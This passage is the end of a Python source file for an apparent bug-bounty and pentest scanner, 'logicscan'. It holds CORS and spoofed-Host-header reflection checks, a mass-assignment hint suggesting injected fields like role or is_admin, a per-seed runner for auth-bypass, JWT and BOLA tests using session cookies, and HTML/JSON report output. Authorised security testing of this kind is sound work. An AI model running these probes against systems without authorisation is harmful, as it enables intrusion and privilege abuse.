                                       summary=f"CORS reflects arbitrary Origin (ACAC={acc or 'false'})", evidence=f"ACAO={aco}", extra={}))
            elif aco == "*":
                self.sink.add(Finding(kind="cors_wildcard", seed=self.seed, url=crawl.final_url or self.seed, severity="low",
                                       summary="CORS wildcard (Access-Control-Allow-Origin: *)", evidence="", extra={}))
        except Exception:
            pass

        # reflected Host header (lead only)
        try:
            evil_host = "logicscan-host-test.example.org"
            r = self.sess.get(crawl.final_url or self.seed, cookies=self.req_cookies, timeout=self.timeout,
                               headers={"Host": evil_host})
            if evil_host in (r.text or ""):
                self.sink.add(Finding(kind="host_header_reflected", seed=self.seed, url=crawl.final_url or self.seed,
                                       severity="low", summary="Custom Host header is reflected in the response body",
                                       evidence="Possible lead for password-reset-link poisoning / cache poisoning -- verify manually", extra={}))
        except Exception:
            pass

    # ---- mass assignment candidate hint ----

    def test_mass_assignment_hint(self, crawl: CrawlData):
        for call in crawl.xhr_calls:
            if call["method"] in ("POST", "PUT", "PATCH") and call.get("post_data"):
                try:
                    body = json.loads(call["post_data"])
                except Exception:
                    continue
                if isinstance(body, dict) and len(body) >= 4:
                    self.sink.add(Finding(
                        kind="mass_assignment_candidate", seed=self.seed, url=call["url"], severity="info",
                        summary="Multi-field JSON write request -- candidate for manual mass-assignment testing "
                                "(try adding fields like role/is_admin/balance and see if they're accepted)",
                        evidence=f"observed fields: {list(body.keys())}", extra={}))


# ─────────────────────────────── per-seed job ────────────────────────────────

def run_seed(seed, args, sink: FindingSink):
    print(f"[*] Crawling: {seed}")
    pw_cookies, req_cookies = parse_cookie_input(args.cookie, args.cookie_file, seed)
    _, req_cookies2 = parse_cookie_input(args.cookie2, args.cookie2_file, seed) if (args.cookie2 or args.cookie2_file) else ([], {})

    crawler = Crawler(timeout_ms=args.timeout * 1000, depth=args.depth, max_pages=args.max_pages, headless=not args.no_headless)
    try:
        crawl = crawler.crawl(seed, pw_cookies)
    except Exception as e:
        print(f"    [!] crawl failed for {seed}: {e}")
        return None

    print(f"    crawled {len(crawl.responses)} responses, {len(crawl.forms)} forms, "
          f"{len(crawl.xhr_calls)} xhr/fetch calls, title='{crawl.title}'")

    tester = LogicTester(sink, seed, req_cookies, req_cookies2, args.timeout, args.time_based)

    if not args.skip_auth_bypass:
        tester.test_auth_bypass(crawl)
    if not args.skip_jwt:
        tester.test_jwt(crawl)
    if not args.skip_bola:
        tester.test_bola(crawl)
    if not args.skip_info_disclosure:
        tester.test_info_disclosure(crawl)
    if not args.skip_headers:
        tester.test_headers_and_session(crawl)
    tester.test_mass_assignment_hint(crawl)

    return crawl


# ─────────────────────────────── output ────────────────────────────────

def write_outputs(out_dir, mode, seeds, sink: FindingSink, elapsed):
    os.makedirs(out_dir, exist_ok=True)
    findings = [f.to_dict(mode) for f in sink.findings]

    counts = {}
    for f in findings:
        counts[f["kind"]] = counts.get(f["kind"], 0) + 1

    report = {"mode": mode, "seeds": seeds, "elapsed_seconds": round(elapsed, 1),
              "total_findings": len(findings), "counts": counts, "findings": findings}
    with open(os.path.join(out_dir, "report.json"), "w") as fh:
        json.dump(report, fh, indent=2)

    write_html(out_dir, report)
    return report


def write_html(out_dir, report):
    def esc(s):
        return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") if s is not None else ""

    def badge(sev):
        return f"<span class='badge {esc(sev)}'>{esc(sev).upper()}</span>"

    mode = report["mode"]
    findings = sorted(report["findings"], key=lambda f: SEV_ORDER.get(f["severity"], 5))

    if mode == "bb":
        in_scope = [f for f in findings if f.get("bb_scope") == "in_scope"]
        varies = [f for f in findings if f.get("bb_scope") == "varies"]
        oos = [f for f in findings if f.get("bb_scope") == "out_of_scope"]
        sections = [("Likely IN SCOPE (report these)", in_scope, ""),
                    ("VARIES — check program policy", varies, "border-color:#ffd43b"),
                    ("Likely OUT OF SCOPE (common program exclusions)", oos, "opacity:.6")]
    else:
        sections = [("All findings (pentest mode — full technical severity, no scope filtering)", findings, "")]

    def render_rows(items):
        rows = ""
        for f in items:
            extra_note = f"<div class='muted'>{esc(f.get('bb_note',''))}</div>" if mode == "bb" and f.get("bb_note") else ""
            rows += f"""<tr class="{esc(f['severity'])}">
              <td>{badge(f['severity'])}</td>
              <td>{esc(f['kind'])}</td>
              <td><code>{esc(f['url'])}</code></td>
              <td>{esc(f['summary'])}{extra_note}</td>
              <td><code class="ev">{esc(f['evidence'])[:400]}</code></td>
            </tr>"""
        return rows

    sections_html = ""
    for title, items, style in sections:
        if not items:
            continue
        sections_html += f"""
        <h2 style="{style}">{esc(title)} <span class="muted">({len(items)})</span></h2>
        <table><tr><th>Sev</th><th>Kind</th><th>URL</th><th>Summary</th><th>Evidence</th></tr>
        {render_rows(items)}
        </table>"""

    seeds_html = "".join(f"<li>{esc(s)}</li>" for s in report["seeds"])

    html = f"""<!doctype html><html><head><meta charset="utf-8"><title>logicscan report</title>
<style>
body{{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0b0e14;color:#dce1e8;margin:2rem}}
h1{{color:#fff;margin-bottom:.2rem}} h2{{margin-top:2rem;border-left:4px solid #4dabf7;padding-left:.6rem}}
table{{width:100%;border-collapse:collapse;font-size:13px;margin-top:.5rem}}
td,th{{border:1px solid #232834;padding:7px 9px;text-align:left;vertical-align:top}}
th{{background:#161a24}} code{{color:#9ecbff;word-break:break-all}} code.ev{{color:#c3c9d4;font-size:11px}}
tr.critical{{background:#3a1414}} tr.high{{background:#3a2414}} tr.medium{{background:#33321a}} tr.low{{background:#15222b}} tr.info{{background:#11141a}}
.summary{{display:flex;gap:1rem;margin:1rem 0;flex-wrap:wrap}}
.card{{background:#161a24;padding:1rem 1.2rem;border-radius:8px;min-width:120px}}
.card b{{font-size:1.6rem;display:block}}
.badge{{display:inline-block;padding:1px 7px;border-radius:10px;font-size:10px;font-weight:700}}
.badge.critical{{background:#ff4d4d;color:#1a0000}} .badge.high{{background:#ff9f43;color:#2a1400}}
.badge.medium{{background:#ffd43b;color:#2a2400}} .badge.low{{background:#51cf66;color:#002a08}}
.badge.info{{background:#4dabf7;color:#001a2a}}
.muted{{color:#8893a7;font-size:11px}}
details{{background:#161a24;padding:.6rem 1rem;border-radius:8px;margin-top:.5rem}}
</style></head><body>
<h1>logicscan</h1>
<p class="muted">mode: <b>{esc(mode.upper())}</b> &middot; {report['elapsed_seconds']}s &middot; {report['total_findings']} findings</p>
<div class="summary">
<div class="card"><b>{len(report['seeds'])}</b>seeds scanned</div>
<div class="card"><b>{report['total_findings']}</b>total findings</div>
</div>
<details><summary>Seeds</summary><ul>{seeds_html}</ul></details>
{sections_html}
<p class="muted" style="margin-top:2rem">
Every finding here is a heuristic LEAD with evidence, not a confirmed vulnerability — logic/functional bugs
need human judgment to confirm. BB-scope tags reflect common HackerOne/Bugcrowd exclusion patterns, not any
specific program's policy — always check the actual scope doc before reporting or discarding a finding.
</p>
</body></html>"""
    with open(os.path.join(out_dir, "report.html"), "w") as fh:
        fh.write(html)


# ─────────────────────────────── CLI / orchestration ────────────────────────────────

def load_seeds(args):
    seeds = list(args.url or [])
    if args.list:
        with open(args.list) as fh:
            seeds += [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    out, seen = [], set()
    for s in seeds:
        if not s.startswith("http"):
            s = "https://" + s
        if s not in seen:
            seen.add(s)
            out.append(s)
    return out


def build_argparser():
    p = argparse.ArgumentParser(description="Headless crawl + logic/functional vulnerability triage (bug bounty / pentest)")
    p.add_argument("-u", "--url", action="append", help="seed URL (repeatable), e.g. https://example.com/auth/sign_in")
    p.add_argument("-l", "--list", help="file of seed URLs, one per line")
    p.add_argument("-o", "--output", default="logicscan_out")
    p.add_argument("--mode", choices=["bb", "pt"], default="bb",
                    help="bb = tag findings by common bug-bounty scope exclusions; pt = full severity, no scope filtering")
    p.add_argument("-t", "--threads", type=int, default=4, help="concurrent seeds (each spins up its own Chromium)")
    p.add_argument("--depth", type=int, default=1, help="link-follow depth from each seed (keep shallow, this targets a specific endpoint)")
    p.add_argument("--max-pages", type=int, default=15, help="max pages visited per seed")
    p.add_argument("--timeout", type=int, default=15, help="HTTP/navigation timeout (s)")
    p.add_argument("--no-headless", action="store_true", help="show the browser (debugging only)")
    p.add_argument("--cookie", default="", help='cookie string for the primary account, e.g. "session=abc; csrftoken=xyz"')
    p.add_argument("--cookie-file", default="", help="file containing cookie string or JSON cookie list / storage_state.json")
    p.add_argument("--cookie2", default="", help="cookie string for a SECOND, different low-priv account, enables confirmed cross-account BOLA")
    p.add_argument("--cookie2-file", default="")
    p.add_argument("--time-based", action="store_true", help="reserved for future timing-based NoSQLi/SQLi checks")
    p.add_argument("--skip-auth-bypass", action="store_true")
    p.add_argument("--skip-jwt", action="store_true")
    p.add_argument("--skip-bola", action="store_true")
    p.add_argument("--skip-info-disclosure", action="store_true")
    p.add_argument("--skip-headers", action="store_true")
    return p


def main():
    args = build_argparser().parse_args()
    seeds = load_seeds(args)
    if not seeds:
        print("[!] No seed URLs given. Use -u/--url (repeatable) or -l/--list.")
        sys.exit(1)

    sink = FindingSink()
    t0 = time.time()

    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(run_seed, s, args, sink): s for s in seeds}
        for fut in concurrent.futures.as_completed(futs):
            seed = futs[fut]
            try:
                fut.result()
            except Exception as e:
                print(f"    [!] seed {seed} raised: {e}")

    elapsed = time.time() - t0
    report = write_outputs(args.output, args.mode, seeds, sink, elapsed)

    print("\n" + "=" * 60)
    print(f"Done in {elapsed:.1f}s across {len(seeds)} seed(s). {report['total_findings']} findings.")
    for k, v in sorted(report["counts"].items(), key=lambda x: -x[1]):
        print(f"  {k:28s}: {v}")
    print(f"\nOutput dir: {os.path.abspath(args.output)}")
    print(f"  - report.html  (mode={args.mode}, open in a browser)")
    print(f"  - report.json")


if __name__ == "__main__":
    main()
